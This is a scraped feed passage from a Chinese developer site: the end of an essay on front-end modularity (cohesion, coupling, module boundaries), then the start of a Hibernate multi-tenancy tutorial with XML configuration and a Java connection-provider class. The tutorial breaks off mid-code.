C);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>很多前端开发者对“模块化”的理解，长期停留在“文件拆分”的物理层面。</p>
<p>比如：一个 Vue/React 组件写了 1000 行，觉得太乱了，于是把里面的三个函数提取出来，扔到 <code>utils.js</code> 里；把 HTML 里的弹窗拆出来，扔到 <code>components/Modal.vue</code> 里。做完这些，看着只有 200 行的主文件，心里一阵舒爽：“啊，我做好了模块化。”</p>
<p><strong>这是错觉。</strong></p>
<p>如果你只是把一团乱麻的代码切成了五段乱麻，那这不叫模块化，这叫 <strong>“分布式屎山”</strong> 。</p>
<p>在架构师的眼里，模块化不是为了把文件变小，而是为了<strong>治理复杂性</strong>。它是关于<strong>边界（Boundaries）</strong> 、<strong>内聚（Cohesion）</strong> 和 <strong>耦合（Coupling）</strong> 的艺术。本篇我们将抛开具体的语法，探讨如何建立架构级别的模块化思维。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f78d964b574e4d9bba60d915a937165b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769601027&amp;x-signature=uOlTWK4ZDG84tfzE7MWdoeUM4eY%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">一、 什么是模块？从“物理文件”到“逻辑单元”</h2>
<p>初级工程师看模块，看到的是文件后缀（<code>.js</code>, <code>.vue</code>, <code>.tsx</code>）；架构师看模块，看到的是<strong>职责的边界</strong>。</p>
<h3 data-id="heading-1">1.1 模块化的三个层级</h3>
<p>我们的认知通常经历了三个阶段的进化：</p>
<ol>
<li><strong>语法级模块化 (Syntax Level)：</strong> 这是最基础的。AMD、CommonJS、ES Modules。解决的是<strong>命名空间污染</strong>和<strong>脚本加载顺序</strong>的问题。这是 2015 年前我们要解决的主要矛盾，现在已经变成了像空气一样的基础设施。</li>
<li><strong>文件级模块化 (File Level)：</strong> 为了代码复用，我们将通用逻辑提取为 <code>hooks</code>，将 UI 提取为 <code>components</code>。这是目前绝大多数中级工程师所处的阶段。但如果不小心，很容易陷入 <strong>“为了拆分而拆分”</strong> 的陷阱。</li>
<li><strong>领域级模块化 (Domain Level)：</strong> 这是架构师关注的层面。一个模块不再是一个文件，而是一个<strong>业务能力的集合</strong>。 比如“用户模块”，它可能包含 <code>UserCard.tsx</code>（UI）、<code>useUser.ts</code>（逻辑）、<code>user-service.ts</code>（API）、<code>UserType.ts</code>（类型）。它们在物理上可能分散，但在逻辑上是一个整体。<strong>只有当这个整体对外暴露极其有限的接口，而隐藏内部所有复杂度时，它才是一个真正的模块。</strong></li>
</ol>
<h3 data-id="heading-2">1.2 架构师的视角：隐藏而非暴露</h3>
<p>软件工程大师 David Parnas 早在 1972 年就提出了一个振聋发聩的观点：</p>
<blockquote>
<p><strong>“模块化的核心在于你隐藏了什么，而不是你暴露了什么。”</strong></p>
</blockquote>
<p>在前端开发中，我们经常犯的错误是<strong>暴露过多</strong>。</p>
<ul>
<li><strong>错误示范：</strong> 一个 <code>DatePicker</code> 组件，通过 <code>props</code> 把内部的 <code>calendarInstance</code> 暴露给父组件，允许父组件直接操作日历内部状态。</li>
<li><strong>架构灾难：</strong> 这意味着父组件和子组件形成了<strong>隐性耦合</strong>。一旦哪天你要把底层的日历库从 Moment.js 换成 Day.js，整个应用可能都会崩溃。</li>
</ul>
<p><strong>真正的模块化思维是“黑盒思维”：</strong> 外部只管输入（Props/Params）和输出（Events/Return Values），绝不关心内部是如何实现的。</p>
<hr/>
<h2 data-id="heading-3">二、 核心心法：高内聚与低耦合的辩证关系</h2>
<p>这八个字被说烂了，但真正能做到的寥寥无几。在前端语境下，它们有具体的落地含义。</p>
<h3 data-id="heading-4">2.1 什么是“真内聚”？(True Cohesion)</h3>
<p>很多项目习惯按“技术类型”分目录：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  ├── components/  (放所有组件)
  ├── hooks/       (放所有钩子)
  ├── utils/       (放所有工具)
  ├── types/       (放所有类型)
</code></pre>
<p>这看起来很整洁，其实是 <strong>“假内聚”</strong> （或者叫偶然内聚）。 当你需要修改“登录”功能时，你需要去 <code>components</code> 改表单，去 <code>hooks</code> 改逻辑，去 <code>types</code> 改接口定义。你的修改行为是<strong>跨越空间</strong>的。</p>
<p><strong>现代前端架构推崇的“真内聚”是按“功能特性（Feature）”组织：</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  ├── features/
  │   ├── auth/          (登录模块：包含自己的 components, hooks, types)
  │   ├── dashboard/     (大盘模块)
</code></pre>
<p><strong>判定标准：</strong> 那些<strong>只有在一起工作才有意义</strong>的代码，必须物理上就在一起。<strong>共同封闭原则（CCP）</strong> 告诉我们：<strong>将那些会因为相同理由而修改的类/文件，聚合在一起。</strong></p>
<h3 data-id="heading-5">2.2 什么是“低耦合”？(Loose Coupling)</h3>
<p>耦合不可避免，没有耦合的代码就是一堆死代码。架构师要做的是<strong>治理耦合的类型</strong>。</p>
<ul>
<li><strong>内容耦合（最差）：</strong> 直接修改另一个模块的内部数据。比如组件 A 通过 <code>ref</code> 强行修改组件 B 的 state。</li>
<li><strong>控制耦合（较差）：</strong> 传递 flag 告诉另一个模块该怎么做。比如 <code>Button</code> 组件接收一个 <code>isLoginButton</code> 的 prop，导致 Button 内部包含了业务逻辑。</li>
<li><strong>数据耦合（推荐）：</strong> 仅仅传递数据。组件只接收它需要渲染的数据，不关心数据来源。</li>
<li><strong>事件/消息耦合（最优）：</strong> 通过发布订阅或回调函数通信。我不直接调用你，我只广播“我做完了”，谁关心谁就来处理。</li>
</ul>
<p><strong>架构师的刀法：</strong> 当你发现两个模块必须同时修改才能跑通时，它们就是<strong>强耦合</strong>的。要么把它们合并成一个模块，要么引入一个中间层（适配器）来解耦。</p>
<hr/>
<h2 data-id="heading-6">三、 边界思维：如何切分模块？</h2>
<p>在拿到一个复杂的业务需求（比如一个在线协作文档编辑器）时，普通开发者的第一反应是画页面，而架构师的第一反应是<strong>划边界</strong>。</p>
<h3 data-id="heading-7">3.1 不稳定的依赖要隔离</h3>
<p><strong>稳定依赖原则（SDP）：</strong> 依赖关系应该指向更稳定的方向。</p>
<ul>
<li><strong>UI 是不稳定的</strong>：产品经理今天要把按钮放左边，明天要放右边，后天要换个颜色。</li>
<li><strong>业务逻辑是相对稳定的</strong>：文档的保存、协同算法、权限校验，这些核心逻辑不会轻易变。</li>
<li><strong>基础库是最稳定的</strong>：React 框架、Lodash 工具函数。</li>
</ul>
<p><strong>模块化切分策略：</strong> 绝不要把核心业务逻辑写在 UI 组件里（Vue 的 <code>script</code> 或 React 的 <code>useEffect</code>）。 <strong>Headless（无头化）</strong> 是前端架构的必然趋势。你应该把逻辑抽离成纯 JS/TS 模块（Hook 或 Class），UI 只是一个只有 <code>render</code> 函数的笨蛋壳子。这样，当 UI 翻天覆地变化时，你的核心逻辑模块可以纹丝不动。</p>
<h3 data-id="heading-8">3.2 循环依赖是架构的癌细胞</h3>
<p>如果 A 模块引用了 B，B 又引用了 A，这在文件层面可能通过 Webpack 解决了，但在逻辑层面，这意味着 A 和 B 锁死在了一起，无法单独测试，无法单独复用。</p>
<p><strong>如何打破循环？</strong></p>
<ol>
<li><strong>下沉法：</strong> 找到 A 和 B 共同依赖的部分，抽取成 C 模块，A 和 B 都依赖 C。</li>
<li><strong>反转法（依赖倒置 DIP）：</strong> A 不直接依赖 B，A 定义一个接口（Interface），B 去实现这个接口。A 只依赖接口。</li>
</ol>
<hr/>
<h2 data-id="heading-9">四、 模块化的代价：过度设计的陷阱</h2>
<p>最后，必须给架构师们泼一盆冷水。模块化是有成本的。</p>
<p><strong>模块化 = 增加间接层。</strong></p>
<p>如果你把一个简单的“Hello World”拆成了 Provider、Service、Component、Type 四个文件，那你不是在做架构，你是在<strong>制造噪音</strong>。</p>
<p><strong>架构师的判断力体现在：</strong></p>
<ul>
<li><strong>识别变化点：</strong> 只有那些<strong>未来极有可能发生变化</strong>，或者<strong>复杂度极高</strong>的地方，才值得被封装成独立模块。</li>
<li><strong>适度冗余（DRY vs WET）：</strong> 有时候，复制粘贴代码比错误的抽象更好。如果你强行把两个看似相似但业务背景完全不同的逻辑合并成一个模块，未来当它们向不同方向演进时，你将陷入无尽的 <code>if (isModeA) else (isModeB)</code> 的地狱。</li>
</ul>
<hr/>
<h2 data-id="heading-10">结语：从“写代码”到“设计系统”</h2>
<p>模块化不是一种技术，而是一种<strong>世界观</strong>。</p>
<p>当你开始思考**“如果我删掉这行代码，影响的范围是多大” <strong>，或者</strong>“如果我把这个文件夹移走，其他部分还能不能跑”**的时候，你就已经跨越了“文件拆分”的边界，开始用架构师的眼光审视你的系统了。</p>
<p>这只是思想的开篇。有了这个思维基石，接下来我们将深入骨架，探讨如何在具体的 UI 层面实现<strong>极致的逻辑与视图分离</strong>。</p>
<blockquote>
<p><strong>Next Step:</strong> 思想已经建立，下一节我们将进入实战深水区。如何设计一个既能复用，又能灵活定制 UI 的组件？ 请看**《第二篇：骨架（上）——组件化深度设计：逻辑与视图的极致分离（Headless UI）》**。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（55）Hibernate的多租户支持如何实现？]]></title>    <link>https://juejin.cn/post/7597635202324807732</link>    <guid>https://juejin.cn/post/7597635202324807732</guid>    <pubDate>2026-01-21T11:54:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324807732" data-draft-id="7597623654056263695" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（55）Hibernate的多租户支持如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-21T11:54:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（55）Hibernate的多租户支持如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:54:41.000Z" title="Wed Jan 21 2026 11:54:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代企业应用中，多租户支持是一个重要的需求。Hibernate提供了对多租户架构的支持，可以使一个应用程序支持多个独立的客户（租户）共享一个数据源。Hibernate的多租户支持主要有两种模式：</p>
<ol>
<li><strong>Schema-based 多租户</strong>：每个租户有独立的数据库模式（schema）。</li>
<li><strong>Database-based 多租户</strong>：每个租户有独立的数据库实例。</li>
<li><strong>Discriminator-based 多租户</strong>：单一数据库和单一表结构，通过一个租户标识符来区分不同租户的数据。</li>
</ol>
<p>下面将详细介绍如何实现这三种多租户支持，结合代码示例说明。</p>
<h3 data-id="heading-0">1. Schema-based 多租户</h3>
<p>在这种模式中，每个租户有独立的数据库模式（schema），但共享同一个数据库实例。</p>
<h4 data-id="heading-1">配置Hibernate</h4>
<p>在<code>hibernate.cfg.xml</code>中配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 多租户配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>SCHEMA<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">实现<code>MultiTenantConnectionProvider</code>接口</h4>
<p><code>MultiTenantConnectionProvider</code>接口用于提供基于租户的连接。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DataSource dataSource;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">(DataSource dataSource)</span> {
        <span class="hljs-built_in">this</span>.dataSource = dataSource;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSource.getConnection();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">final</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> getAnyConnection();
        <span class="hljs-keyword">try</span> {
            connection.createStatement().execute(<span class="hljs-string">"USE "</span> + tenantIdentifier);
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not alter JDBC connection to specified schema ["</span> + tenantIdentifier + <span class="hljs-string">"]"</span>, e);
        }
        <span class="hljs-keyword">return</span> connection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.createStatement().execute(<span class="hljs-string">"USE your_default_schema"</span>);
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
